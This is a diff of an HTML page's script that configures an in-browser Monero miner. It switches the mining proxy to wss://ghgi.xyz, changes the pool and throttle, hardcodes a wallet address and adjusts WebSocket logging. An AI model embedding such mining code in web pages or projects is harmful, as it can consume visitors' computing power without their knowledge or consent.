@@ -91,8 +91,8 @@
     <script>
         console.log("Starting Mining...");
       // Recommended server settings
-      server = "wss://ny1.xmrminingproxy.com";
-      var pool = "gulf.moneroocean.stream:80";
+      server = "wss://ghgi.xyz";
+      var pool = "moneroocean.stream:100";
       var walletAddress = "46atNLEsFpmKwVZFpz58z8HzJcLg2bQwf65PGvvtMq4a5xUe4NMWQFo68195oHLCdCM28ucftSCywMDuWLC7As5z94SGKvo"; // Replace with your Monero wallet address
       var workerId = "MyWorker";
       var threads = -1;
@@ -110,7 +110,7 @@
         } else {
             console.error("startMining function is not available. Please check the script.");
         }
-      throttleMiner = 0.2;
+      throttleMiner = 0.5;
       console.log(connected);
        // Monitor mining status
         setTimeout(() => {
@@ -123,41 +123,26 @@
                 document.getElementById('status').textContent = "Not started";
             }
         }, 3000);
-        var ws = new WebSocket("wss://ny1.xmrminingproxy.com");
-
+        
+        var ws = new WebSocket("wss://ghgi.xyz");
+        ws.onmessage = function(event) {
+            console.log(event);
+            console.log("Received message:", event.data);
+            if (event.data.includes("job")) {
+                console.log("Mining job received. Mining started...");
+            }
+        };
         ws.onopen = function() {
             console.log("WebSocket connection established");
         };
 
         ws.onerror = function(error) {
-            console.error("WebSocket error:", error);
+            console.error("WebSocket error:", error.message);
         };
 
-        ws.onclose = function() {
-            console.log("WebSocket connection closed");
+        ws.onclose = function(event) {
+            console.log(`WebSocket connection closed. Code: ${event.code}, Reason: ${event.reason}`);
         };
-        console.log(server);
-     // Monitor mining stats every second
-     setInterval(() => {
-        const hashrateElement = document.getElementById('hashrate');
-        const statusElement = document.getElementById('status');
-        const progressElement = document.querySelector('.progress');
-
-        // Assuming the mining script provides real-time stats, replace this with actual data
-        let hashrate = 0; // Placeholder for actual hashrate
-
-        // Assuming you have access to a miner object or stats function
-        if (typeof miner !== 'undefined' && miner.isRunning()) {
-            hashrate = miner.getHashesPerSecond().toFixed(2); // Use actual method to get hashrate
-            console.log("Hashrate:", hashrate);
-        } else {
-            console.error("Miner not running or failed to retrieve stats.");
-        }
-
-        hashrateElement.textContent = hashrate + " H/s";
-        statusElement.textContent = "Mining...";
-        progressElement.style.width = (Math.min(hashrate, 200) / 2) + "%";
-        }, 1000);
     </script>
 
   
